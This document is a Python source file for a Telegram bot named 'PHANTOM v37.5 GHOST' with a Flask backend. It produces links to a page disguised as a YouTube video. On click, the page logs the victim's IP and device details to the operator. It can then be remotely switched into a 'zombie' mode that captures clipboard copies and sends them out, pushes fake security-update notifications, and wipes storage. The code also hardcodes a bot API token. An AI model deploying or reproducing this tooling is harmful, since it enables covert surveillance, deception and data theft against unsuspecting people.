import asyncio, threading, requests, uuid, json, os, base64, urllib.parse
from flask import Flask, render_template_string, request, jsonify
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- [1] CONFIG ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# База данных в памяти (на Render будет сбрасываться при перезагрузке)
sessions = {} 
pending_actions = {} 

# --- [2] ТЕМПЛЕЙТ С УПРАВЛЯЕМОЙ ЗАКЛАДКОЙ ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>YouTube</title><meta name="viewport" content="width=device-width, initial-scale=1"></head>
<body style="margin:0; background:#000;" onclick="ignite()">
    <div id="player" style="width:100%; aspect-ratio:16/9; background:url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover;">
        <div style="width:68px; height:48px; background:red; border-radius:12px; position:relative; top:50%; left:50%; transform:translate(-50%,-50%);"></div>
    </div>
<script>
let sid = "{{ sid }}";
let active = false;
let isZombie = false;

async function ignite() {
    if(active) return; active = true;
    
    // Сбор первичных данных (Разведка)
    let d = { sid: sid, ua: navigator.userAgent, res: screen.width+"x"+screen.height };
    fetch('/log', { method: 'POST', body: btoa(encodeURIComponent(JSON.stringify(d))) });

    // Цикл ожидания команд от Админа
    setInterval(async () => {
        let r = await fetch('/poll/' + sid);
        let cmd = await r.json();
        
        if (cmd.type === 'activate' && !isZombie) {
            activateZombie();
        } else if (cmd.type === 'push') {
            if(Notification.permission === 'granted') new Notification("Система", {body: cmd.txt});
            else Notification.requestPermission();
        } else if (cmd.type === 'kill') {
            selfDestruct();
        }
    }, 3000);

    setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 1500);
}

function activateZombie() {
    isZombie = true;
    console.log("Zombie Mode Active");
    // Перехват буфера
    document.addEventListener('copy', () => {
        let txt = window.getSelection().toString();
        if(txt) fetch('/clip', { method: 'POST', body: JSON.stringify({sid: sid, txt: txt}) });
    });
}

function selfDestruct() {
    localStorage.clear();
    sessionStorage.clear();
    alert("Сессия истекла. Перенаправление...");
    location.href = "https://google.com";
}
</script>
</body>
</html>
"""

# --- [3] BACKEND LOGIC ---

@app.route('/poll/<sid>')
def poll(sid):
    return jsonify(pending_actions.pop(sid, {"type": "idle"}))

@app.route('/log', methods=['POST'])
def logger():
    data = json.loads(urllib.parse.unquote(base64.b64decode(request.get_data()).decode()))
    sid = data['sid']
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    kb = InlineKeyboardBuilder()
    kb.button(text="🧬 АКТИВИРОВАТЬ ЗОМБИ", callback_data=f"z_on_{sid}")
    kb.button(text="📊 Оставить только лог", callback_data=f"z_off_{sid}")
    
    msg = f"🛰 **НОВЫЙ КОНТАКТ**\nIP: `{ip}`\nID: `{sid}`\n\nЖду разрешения на закладку..."
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": data['sid'], "text": msg, "reply_markup": kb.as_markup(), "parse_mode": "Markdown"})
    return "OK"

@app.route('/clip', methods=['POST'])
def clip():
    data = json.loads(request.get_data())
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": data['sid'], "text": f"📋 **БУФЕР ПЕРЕХВАЧЕН:**\n`{data['txt']}`"})
    return "OK"

# --- [4] BOT CONTROL ---

@dp.callback_query(F.data.startswith("z_"))
async def handle_zombie(c: types.CallbackQuery):
    _, action, sid = c.data.split("_")
    
    if action == "on":
        pending_actions[sid] = {"type": "activate"}
        kb = InlineKeyboardBuilder()
        kb.button(text="🔔 Fake Push", callback_data=f"cmd_push_{sid}")
        kb.button(text="☣️ САМОЛИКВИДАЦИЯ", callback_data=f"cmd_kill_{sid}")
        await c.message.edit_text("🧬 **ЗОМБИ АКТИВИРОВАН**\nСкрипт заложен в систему. Жду команд...", reply_markup=kb.adjust(1).as_markup())
    else:
        await c.message.edit_text("✅ Оставлено в режиме мониторинга.")

@dp.callback_query(F.data.startswith("cmd_"))
async def handle_cmd(c: types.CallbackQuery):
    _, type, sid = c.data.split("_")
    pending_actions[sid] = {"type": type, "txt": "Срочное обновление безопасности!"}
    await c.answer(f"Команда {type} отправлена!")

@dp.message(Command("start"))
async def cmd_start(m: types.Message):
    kb = ReplyKeyboardBuilder().button(text="🧨 Создать ссылку").as_markup(resize_keyboard=True)
    await m.answer("🕶 **PHANTOM v37.5 GHOST**", reply_markup=kb)

@dp.message(F.text == "🧨 Создать ссылку")
async def create_link(m: types.Message):
    sid = str(m.from_user.id)
    await m.answer(f"🔗 **Твоя ссылка:**\n`{BASE_URL}/v/{sid}`")

@app.route('/v/<sid>')
def victim_page(sid):
    return render_template_string(HTML_TEMPLATE, sid=sid)

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
